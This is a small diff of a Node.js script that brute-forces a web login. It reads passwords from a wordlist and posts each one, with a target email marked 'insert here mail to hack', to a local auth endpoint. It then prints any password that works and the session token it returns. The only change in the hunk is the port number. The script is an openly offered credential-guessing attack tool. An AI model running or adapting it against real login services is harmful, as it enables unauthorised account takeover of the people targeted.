@@ -13,7 +13,7 @@ var email = 'c@c.it' //insert here mail to hack
 console.log("Trying...")
 lineReader.eachLine('./pwd_list.txt',(line)=>{
     myJSONObject = {'mail': email, "pwd": line}
-    axios.post('http://127.0.0.1:3000/api/user/auth', myJSONObject)
+    axios.post('http://127.0.0.1:3001/api/user/auth', myJSONObject)
     .then(response => {
         console.log("Password Found: " + line)
         console.log("I've got this valid session token [ " + response.data.token + " ]")
